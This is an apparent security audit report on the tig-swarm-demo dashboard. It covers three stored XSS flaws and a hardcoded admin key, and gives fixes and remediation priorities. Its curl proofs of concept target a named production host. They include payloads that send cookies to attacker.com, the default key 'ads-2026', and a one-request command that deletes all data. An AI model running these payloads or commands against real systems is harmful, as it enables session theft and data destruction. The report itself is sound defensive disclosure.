\subsection{Executive Summary}

This audit identified four high-severity vulnerabilities in the tig-swarm-demo project. Three are stored cross-site scripting (XSS) vulnerabilities that allow unauthenticated attackers to execute arbitrary JavaScript in all connected dashboard viewers' browsers. The fourth is a hardcoded default admin credential that grants unauthenticated access to destructive administrative operations including full data deletion.


All four vulnerabilities are actively exploitable against the production deployment at demo.discoveryatscale.com. The XSS vulnerabilities share a common root cause: the dashboard renders user-controlled data via innerHTML without HTML escaping. A shared escape utility already exists in one panel but is not applied elsewhere.

\subsection{Architecture Overview}

The application consists of three components:


\begin{itemize}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item \textbf{Server} (\texttt{server/\allowbreak }): Python FastAPI application with SQLite database, WebSocket support, and REST API endpoints for agent registration, hypothesis submission, message posting, and admin operations
  \item \textbf{Dashboard} (\texttt{dashboard/\allowbreak }): TypeScript single-page application that connects via WebSocket to display real-time swarm activity including a feed panel, ideas tree, leaderboard, and route visualizations
  \item \textbf{Solver} (\texttt{src/\allowbreak }): Rust VRPTW solver that agents modify and benchmark
\end{itemize}

Data flows from agents through the server API to all connected dashboard clients via WebSocket broadcast. The server uses Pydantic models for request validation but performs no HTML sanitization. The dashboard renders all received data using innerHTML template literals.


CORS is configured with \texttt{allow\_origins=["*"]}, permitting cross-origin requests from any domain.


\subsection{Findings}

\subsubsection{SA-001: Stored XSS via Hypothesis Title and Chat Messages}

\textbf{Severity:} HIGH  

\textbf{Category:} Cross-Site Scripting (Stored)  

\textbf{Confidence:} 0.9  

\textbf{Affected Files:}  


\begin{itemize}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item \texttt{dashboard/\allowbreak src/\allowbreak panels/\allowbreak ideas-\allowbreak tree.ts} (lines 87, 151-169)
  \item \texttt{server/\allowbreak server.py} (lines 630-674, 903-924)
  \item \texttt{server/\allowbreak models.py} (HypothesisCreate, MessageCreate)
\end{itemize}

\paragraph{Description}

User-supplied hypothesis titles submitted via \texttt{POST /\allowbreak api/\allowbreak hypotheses} and chat message content submitted via \texttt{POST /\allowbreak api/\allowbreak messages} are stored in the SQLite database, broadcast over WebSocket to all connected clients, and rendered in the ideas tree panel via innerHTML without any HTML escaping.


The complete data flow:


\begin{enumerate}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item Agent sends \texttt{POST /\allowbreak api/\allowbreak hypotheses} with arbitrary \texttt{title} string (server.py:630)
  \item Server stores raw title in SQLite (server.py:654)
  \item Server broadcasts raw title via WebSocket: \texttt{"title": req.title} (server.py:662-672)
  \item Dashboard receives WebSocket message and constructs content string (ideas-tree.ts:87): \texttt{content: }Proposed: "\$\{msg.title\}"``
  \item Content is rendered via innerHTML (ideas-tree.ts:151-169) without escaping
\end{enumerate}

The same flow applies to \texttt{/\allowbreak api/\allowbreak messages} with the \texttt{content} field.


No sanitization exists at any layer — not in the Pydantic models, not in the server broadcast logic, and not in the client rendering.


\paragraph{Proof of Concept}

\begin{lstlisting}
# Register as an agent
AGENT=$(curl -s -X POST https://demo.discoveryatscale.com/api/agents/register \
  -H "Content-Type: application/json" \
  -d '{"client_version":"1.0"}')
AGENT_ID=$(echo "$AGENT" | python3 -c "import sys,json; print(json.load(sys.stdin)['agent_id'])")

# Submit hypothesis with XSS payload in title
curl -s -X POST https://demo.discoveryatscale.com/api/hypotheses \
  -H "Content-Type: application/json" \
  -d "{
    \"agent_id\": \"$AGENT_ID\",
    \"title\": \"<img src=x onerror='fetch(\\\"https://attacker.com/steal?c=\\\"+document.cookie)'>\",
    \"description\": \"test\",
    \"strategy_tag\": \"other\"
  }"
\end{lstlisting}

This payload executes in every connected dashboard viewer's browser.


\paragraph{Impact}

\begin{itemize}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item Session hijacking via cookie theft
  \item Credential harvesting via injected login forms
  \item Dashboard defacement affecting all viewers
  \item Keylogging of admin interactions
  \item Pivoting to internal network resources via the viewer's browser
\end{itemize}

\paragraph{Recommendation}

Replace innerHTML with textContent for text-only content, or sanitize all user input before rendering.


\textbf{Client-side fix (ideas-tree.ts):}


\begin{lstlisting}
// Before (vulnerable)
el.innerHTML = `<div class="feed-post-content">${item.content}</div>`;

// After (safe - use escape utility)
el.innerHTML = `<div class="feed-post-content">${escape(item.content)}</div>`;

// escape() already exists in strategy-leaderboard.ts:
function escape(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}
\end{lstlisting}

\textbf{Server-side fix (models.py):}


\begin{lstlisting}
import re

class HypothesisCreate(BaseModel):
    title: str

    @validator('title')
    def sanitize_title(cls, v):
        return re.sub(r'<[^>]*>', '', v)  # Strip HTML tags
\end{lstlisting}

\subsubsection{SA-002: Stored XSS via Agent Name and Message Content in Feed Panel}

\textbf{Severity:} HIGH  

\textbf{Category:} Cross-Site Scripting (Stored)  

\textbf{Confidence:} 0.9  

\textbf{Affected Files:}  


\begin{itemize}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item \texttt{dashboard/\allowbreak src/\allowbreak panels/\allowbreak feed.ts} (lines 42, 46, 74, 78, 84, 90, 104)
  \item \texttt{server/\allowbreak server.py} (lines 903-924)
  \item \texttt{server/\allowbreak models.py} (MessageCreate)
\end{itemize}

\paragraph{Description}

The feed panel constructs HTML strings using \texttt{msg.agent\_name}, \texttt{msg.title}, and \texttt{msg.content} from WebSocket messages and renders them via \texttt{item.innerHTML} at line 104.


While agent names generated during registration (\texttt{POST /\allowbreak api/\allowbreak agents/\allowbreak register}) are server-generated from safe word lists in \texttt{names.py}, the \texttt{/\allowbreak api/\allowbreak messages} POST endpoint accepts a \textbf{separate, user-controlled} \texttt{agent\_name} field in the \texttt{MessageCreate} model. This user-supplied agent name bypasses the safe server-side generation and flows directly to innerHTML.


\begin{lstlisting}
// feed.ts line 46 — user-controlled agent_name interpolated into HTML
text = `<b>${msg.agent_name}</b> proposed: "${msg.title}"`;

// feed.ts line 104 — rendered via innerHTML
item.innerHTML = `<span class="feed-text">${text}</span>`;
\end{lstlisting}

\paragraph{Proof of Concept}

\begin{lstlisting}
curl -s -X POST https://demo.discoveryatscale.com/api/messages \
  -H "Content-Type: application/json" \
  -d '{
    "agent_name": "<svg onload=alert(document.cookie)>",
    "agent_id": "any-uuid",
    "content": "test message",
    "msg_type": "agent"
  }'
\end{lstlisting}

\paragraph{Impact}

Same as SA-001 — arbitrary JavaScript execution in all connected dashboard clients.


\paragraph{Recommendation}

\begin{enumerate}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item Extract the \texttt{escape()} function from \texttt{strategy-\allowbreak leaderboard.ts} into a shared utility module
  \item Apply escaping to all user-controlled fields before innerHTML interpolation in feed.ts
  \item Validate \texttt{agent\_name} in \texttt{MessageCreate} model to reject HTML characters:
\end{enumerate}

\begin{lstlisting}
class MessageCreate(BaseModel):
    agent_name: str
    content: str

    @validator('agent_name')
    def validate_agent_name(cls, v):
        if re.search(r'[<>&"\']', v):
            raise ValueError('agent_name must not contain HTML characters')
        return v
\end{lstlisting}

\subsubsection{SA-003: Stored XSS via Admin Broadcast Message}

\textbf{Severity:} HIGH  

\textbf{Category:} Cross-Site Scripting (Stored)  

\textbf{Confidence:} 0.9  

\textbf{Affected Files:}  


\begin{itemize}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item \texttt{dashboard/\allowbreak src/\allowbreak panels/\allowbreak feed.ts} (lines 90, 108)
  \item \texttt{server/\allowbreak server.py} (lines 1072-1081)
  \item \texttt{server/\allowbreak models.py} (AdminBroadcast)
\end{itemize}

\paragraph{Description}

The \texttt{/\allowbreak api/\allowbreak admin/\allowbreak broadcast} endpoint accepts a \texttt{message} field with no sanitization. The \texttt{AdminBroadcast} Pydantic model has no validators on the message field. The broadcast message is rendered in the feed panel via innerHTML at line 108 without escaping.


This vulnerability is compounded by SA-004 (hardcoded admin key). Because the default admin key \texttt{ads-\allowbreak 2026} is publicly documented, any unauthenticated attacker can send broadcast messages with XSS payloads.


\paragraph{Proof of Concept}

\begin{lstlisting}
curl -s -X POST https://demo.discoveryatscale.com/api/admin/broadcast \
  -H "Content-Type: application/json" \
  -d '{
    "admin_key": "ads-2026",
    "message": "<script>document.location=\"https://attacker.com/steal?c=\"+document.cookie</script>"
  }'
\end{lstlisting}

\paragraph{Impact}

Same as SA-001, with the added concern that admin broadcast messages may receive heightened trust from dashboard viewers, making social engineering payloads more effective.


\paragraph{Recommendation}

\begin{enumerate}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item Escape broadcast message content before rendering (client-side)
  \item Add server-side validation to strip HTML from broadcast messages
  \item Fix the hardcoded admin key (SA-004) to prevent unauthenticated broadcast access
\end{enumerate}

\subsubsection{SA-004: Hardcoded Default Admin Key}

\textbf{Severity:} HIGH  

\textbf{Category:} Insecure Default Credentials  

\textbf{Confidence:} 0.9  

\textbf{Affected Files:}  


\begin{itemize}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item \texttt{server/\allowbreak server.py} (lines 80-83)
  \item \texttt{server/\allowbreak db.py} (lines 107-110)
  \item \texttt{README.md} (lines 49-60)
\end{itemize}

\paragraph{Description}

The admin authentication function uses a hardcoded fallback default:


\begin{lstlisting}
# server.py lines 80-83
async def verify_admin(req: AdminAuth) -> None:
    config = await get_config_cached()
    if req.admin_key != config.get("admin_key", "ads-2026"):
        raise HTTPException(status_code=403, detail="Invalid admin key")
\end{lstlisting}

The same default key \texttt{ads-\allowbreak 2026} is set in \texttt{DEFAULT\_CONFIG} in db.py (line 110) and inserted into the database on initialization. The key is publicly documented in README.md with example curl commands.


There is no environment variable override mechanism. The only way to change the admin key is through \texttt{/\allowbreak api/\allowbreak admin/\allowbreak config}, which itself requires the admin key — creating a chicken-and-egg problem if the default is compromised (which it is, since it is public).


The server runs with \texttt{allow\_origins=["*"]} CORS policy, allowing exploitation from any origin.


\paragraph{Affected Admin Endpoints}

\vspace{0.4em}
\noindent
\small
\begin{tabularx}{\columnwidth}{@{}XXX@{}}
\toprule
\textbf{Endpoint} & \textbf{Method} & \textbf{Impact} \\
\midrule
\texttt{/\allowbreak api/\allowbreak admin/\allowbreak reset} & POST & Deletes ALL data: agents, hypotheses, messages, experiments, agent\_bests, best\_history \\
\texttt{/\allowbreak api/\allowbreak admin/\allowbreak broadcast} & POST & Sends arbitrary messages to all connected clients (enables XSS via SA-003) \\
\texttt{/\allowbreak api/\allowbreak admin/\allowbreak config} & POST & Modifies server configuration values \\
\bottomrule
\end{tabularx}
\vspace{0.4em}

\paragraph{Proof of Concept}

\begin{lstlisting}
# Complete data destruction with a single request
curl -s -X POST https://demo.discoveryatscale.com/api/admin/reset \
  -H "Content-Type: application/json" \
  -d '{"admin_key": "ads-2026"}'
\end{lstlisting}

\paragraph{Impact}

\begin{itemize}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item Complete data loss via \texttt{/\allowbreak api/\allowbreak admin/\allowbreak reset} — all agent registrations, hypotheses, experiments, and leaderboard history deleted
  \item Arbitrary message broadcast to all connected clients via \texttt{/\allowbreak api/\allowbreak admin/\allowbreak broadcast}
  \item Server configuration tampering via \texttt{/\allowbreak api/\allowbreak admin/\allowbreak config}
  \item When chained with SA-003, enables unauthenticated stored XSS via broadcast
\end{itemize}

\paragraph{Recommendation}

\begin{enumerate}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item Require admin key via environment variable at startup:
\end{enumerate}

\begin{lstlisting}
import os

ADMIN_KEY = os.environ.get("ADMIN_KEY")
if not ADMIN_KEY:
    raise RuntimeError("ADMIN_KEY environment variable must be set")

async def verify_admin(req: AdminAuth) -> None:
    if req.admin_key != ADMIN_KEY:
        raise HTTPException(status_code=403, detail="Invalid admin key")
\end{lstlisting}

\begin{enumerate}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item Remove the hardcoded default from \texttt{db.py} DEFAULT\_CONFIG
  \item Remove example curl commands containing the key from README.md
  \item Generate a random admin key on first run if no env var is provided
  \item Log failed authentication attempts for monitoring
\end{enumerate}

\subsection{Findings Evaluated and Excluded}

\subsubsection{Excluded: XSS in Leaderboard Panel via Agent Name}

\textbf{File:} \texttt{dashboard/\allowbreak src/\allowbreak panels/\allowbreak leaderboard.ts} (line 138)  

\textbf{Reason for exclusion:} False positive (confidence 2/10)


While \texttt{agent\_name} is rendered via innerHTML without escaping in leaderboard.ts, the data path for leaderboard entries only uses agent names from the \texttt{agents} database table, which are exclusively populated by the server-side \texttt{generate\_agent\_name()} function. This function selects from hardcoded safe word lists (alphanumeric + hyphens only). There is no user-controlled input vector that reaches the leaderboard agent\_name field.


However, the inconsistent application of escaping (strategy-leaderboard.ts escapes agent names while leaderboard.ts does not) represents a code quality concern that should be addressed as defense-in-depth.


\subsection{Remediation Priority}

\subsubsection{Immediate (before next deployment)}

\begin{enumerate}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item \textbf{SA-004: Replace hardcoded admin key} with environment variable requirement. This blocks the most destructive attack (data wipe) and is the simplest fix.

\begin{enumerate}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item \textbf{SA-001/002/003: Add HTML escaping to all innerHTML assignments.} Extract the existing \texttt{escape()} function from \texttt{strategy-\allowbreak leaderboard.ts} into a shared utility and apply it in ideas-tree.ts and feed.ts.
\end{enumerate}

\subsubsection{Short-term (within one week)}

\begin{enumerate}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item Add server-side input validation in Pydantic models to strip or reject HTML in user-controlled string fields (title, content, agent\_name in messages).
\end{enumerate}

\begin{enumerate}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item Consider replacing innerHTML usage with safer DOM APIs (createElement + textContent) throughout the dashboard.
\end{enumerate}

\begin{enumerate}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item Restrict CORS from \texttt{allow\_origins=["*"]} to the specific dashboard origin.
\end{enumerate}

\subsubsection{Medium-term}

\begin{enumerate}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item Add Content-Security-Policy headers to prevent inline script execution as defense-in-depth.
\end{enumerate}

\begin{enumerate}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item Implement rate limiting on message and hypothesis submission endpoints.
\end{enumerate}

\begin{enumerate}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item Add admin action audit logging.
\end{enumerate}

\subsection{Methodology}

This audit was conducted through static analysis of the full codebase:


\begin{enumerate}
\setlength{\itemsep}{0pt}
\setlength{\parskip}{0pt}
  \item \textbf{Repository context research} — Identified the technology stack (FastAPI + TypeScript), security frameworks in use (Pydantic validation, no sanitization libraries), and established coding patterns
  \item \textbf{Attack surface mapping} — Enumerated all API endpoints accepting user input, WebSocket message flows, and client-side rendering sinks
  \item \textbf{Data flow tracing} — Traced user-controlled data from API entry points through database storage, WebSocket broadcast, and DOM rendering
  \item \textbf{Vulnerability validation} — Each finding was independently validated by a separate analysis pass focused on false positive filtering, confirming the exact code paths, sink types, and exploitability
  \item \textbf{Confidence scoring} — Findings below 80\% confidence were excluded from the report
\end{enumerate}
